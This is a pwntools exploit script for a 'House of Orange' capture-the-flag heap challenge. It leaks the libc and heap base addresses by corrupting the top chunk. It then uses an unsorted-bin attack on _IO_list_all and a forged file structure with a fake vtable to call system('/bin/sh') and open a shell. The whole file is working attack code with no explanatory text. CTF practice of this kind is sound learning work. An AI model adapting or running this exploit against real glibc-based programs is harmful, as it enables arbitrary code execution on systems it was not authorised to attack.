from pwn import *
io = process('./orange')
# io = remote('ctf.v50to.cc',10418)
context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']
libc = ELF("/home/cc/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
context.log_level = "debug"
def slog(name,address): io.success(name+'==>'+hex(address))
def build(name_length,name):
    io.recvuntil(b"Your choice : ")
    io.sendline(b'1')
    io.recvuntil(b"Length of name :")
    io.sendline(str(name_length).encode())
    io.recvuntil(b"Name :")
    io.send(name)
    io.recvuntil(b"Price of Orange:")
    io.sendline(b'16')
    io.recvuntil(b"Color of Orange:")
    io.sendline(b'1')

def show():
    io.recvuntil(b"Your choice : ")
    io.sendline(b'2')

def upgrade(name_length,name):
    io.recvuntil(b"Your choice : ")
    io.sendline(b'3')
    io.recvuntil(b"Length of name :")
    io.sendline(str(name_length).encode())
    io.recvuntil(b"Name:")
    io.send(name)
    io.recvuntil(b"Price of Orange:")
    io.sendline(b'16')
    io.recvuntil(b"Color of Orange:")
    io.sendline(b'1')

def giveup():
    io.recvuntil(b"Your choice : ")
    io.sendline(b'4')
#======= leak the libc_baes=====#
# pause()
build(16,b'aaaaa')       #build k
pl = b'a'*0x30 + p64(0x20) + b'\xa1\x0f\x00'
upgrade(0x50,pl)
build(0x1000,b'bbbbb')   #build 1
build(0x400,b'a'*8)         #build 2
show()
io.recvuntil(b'Name of house : ')
io.recv(8)
unsortedbin = u64(io.recv(6).ljust(8,b'\x00')) - 0x610
slog('unsorted_bin',unsortedbin)
main_arena_offset = libc.sym['__malloc_hook'] +0x10
print(hex(main_arena_offset))
libc_base = unsortedbin - 0x58 - main_arena_offset
slog('main_arena',main_arena_offset + libc_base)
slog('libc_base',libc_base)
pause()
#===== leak the heap_base======#
upgrade(0x400,'a'*16)
show()
io.recvuntil(b'Name of house : ')
io.recv(16)
heap_base = u64(io.recv(6).ljust(8,b'\x00'))-0xc0
slog('heap_base',heap_base)
#===== FSOP ======#
mod_offset = 0xc0
write_ptr_offset = 0x28
write_base_offset = 0x20
chain_offset = 0x68
vtable_offset = 0xd8
list_all = libc_base + libc.sym['_IO_list_all']
slog("_IO_list_all",list_all)
pl = b'a'*0x400
pl += p64(0) + p64(0x21)
pl += p64(0)*2
pl += b'/bin/sh\x00'+ p64(0x61)
pl += p64(0) + p64(list_all-0x10) 
pl += p64(0) + p64(1)       #set base = 0 ,ptr = 1
pl += b'\x00'*0x90
pl += p64(0)                #set mod = 0
pl += b'\x00'*0x10
pl += p64(heap_base + 0x5d0) #0x5d0 is the fake_vtable offset
fake_vtable = p64(0)*3 + p64(libc_base + libc.sym['system'])
#then the list_all will point to unsorted bin
gdb.attach(proc.pidof(io)[0],'b *$rebase(0x0000000000000D68)')
pl += fake_vtable
print('before edit')
print('len',len(pl))
pause()
upgrade(len(pl),pl)
pause()
io.recvuntil(b"Your choice : ")
io.sendline(b'1')
sleep(2)

io.interactive()